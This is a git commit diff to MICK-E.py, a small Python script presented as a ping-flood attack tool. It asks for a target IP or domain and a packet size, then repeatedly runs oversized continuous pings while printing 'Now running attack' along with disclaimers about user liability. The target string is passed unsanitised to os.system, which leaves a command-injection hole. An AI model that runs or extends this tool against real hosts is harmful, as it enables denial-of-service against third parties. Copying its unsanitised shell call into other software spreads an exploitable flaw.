f4933368e22e6ab45dcedfe2df41ba3fc6383436
variouz <52836022+variouz@users.noreply.github.com>
2021-12-04 21:17:00 -0800

    Update MICK-E.py

--- MICK-E.py
+++ MICK-E.py
@@ -1,7 +1,5 @@
 import os
-import keyboard
-import colored
-from goto_py import goto
+from goto_py import goto, goto_
 from colorama import init, Fore, Back, Style
 import time
 import getpass
@@ -9,7 +7,7 @@ import getpass
 # Variable defs
 def cls():
     os.system('cls' if os.name=='nt' else 'clear')
-
+cls()
 Link=f"\n   {Back.WHITE}{Fore.BLACK}Download the program at https://github.com/variouz/MICK-E{Style.RESET_ALL}"
 logoLine="   _______________________________________________________________________"
 startPoint=f"""
@@ -26,7 +24,8 @@ startPoint=f"""
 Continue="\n   [Enter] Continue [Ctrl-C] Exit"
 
 # Start of program
-
+print("\n   Installing dependencies, please wait...\n ")
+os.system('pip install goto-py && pip install colorama')
 cls()
 print(Link)
 print(logoLine)
@@ -36,34 +35,35 @@ print(Continue)
 getpass.getpass("\n   ")
 cls()
 
-#Grab user input for hostname
+# User input for hostname
 print(f" \n   {Fore.CYAN}Enter IP or domain name:{Style.RESET_ALL}\n")
 hostname=input("   ")
 cls()
 
-#Grab user input for amount of bytes
+# User input for amount of bytes
 print(f"\n   {Fore.CYAN}Enter the amount of bytes to attack with (over 1512B seems to break):{Style.RESET_ALL}\n")
 amount=input("   ")
 if amount.isnumeric():
     while 1==1:
         cls()
-        response=os.system(f"ping {hostname}" if os.name=="nt" else f"ping {hostname}")
+        response=os.system(f"ping {hostname}" if os.name=="nt" else f"ping -c 1 {hostname}")
         cls()
         if response == 0:
+            # Run ping if response given
             print(Link)
             print(f"\n   {Fore.CYAN}Now running attack on {hostname} with {amount} bytes...\n")
-            print(f"\n   {Fore.WHITE}Kid, make sure you use a VPN. Please note that we are not accountable for your dumb decisions.\n")
+            print(f"\n   {Fore.WHITE}Please note that we are not accountable for your dumb decisions.\n")
             print(f"\n   {Back.RED}Please note that we are not accountable for your dumb decisions.{Style.RESET_ALL}")
-            print(f"""\n   {Fore.WHITE}How about a story of this things creation while you wait? I made this program as a test to myself
-            on mhy capabilities with OS and exception in Python around November of 2021. How's about that?""")
-            os.system(f"ping {hostname} -l {amount} -t" if os.name=="nt" else f"ping -s {amount} -c {hostname} ")
+            print(f"""\n   {Fore.WHITE}How about a story of this things creation while you wait? I made this program as a test to myself on mhy capabilities with OS and exception in Python around November of 2021. How's about that?""")
+            os.system(f"ping {hostname} -l {amount} -t" if os.name=="nt" else f"ping -s {amount} {hostname}")
         else:
+            # Go back to file start if response failure
             cls()
-            print(f"\n   {Fore.RED}Wrong hostname or number entered. Restarting...")
-            time.sleep(3)
+            print(f"\n   {Fore.RED}Wrong hostname or number entered, or {hostname} does not exist or has DDoS protection. \n   {Style.RESET_ALL}Restarting...")
+            time.sleep(5)
             goto(1)
 else:
     cls()
-    print(f"\n   {Back.RED}Wrong hostname or number entered. Restarting...")
-    time.sleep(3)
+    print(f"\n   {Fore.RED}Wrong hostname or number entered, or {hostname} does not exist or has DDoS protection. \n   {Style.RESET_ALL}Restarting...")
+    time.sleep(5)
     goto(1)
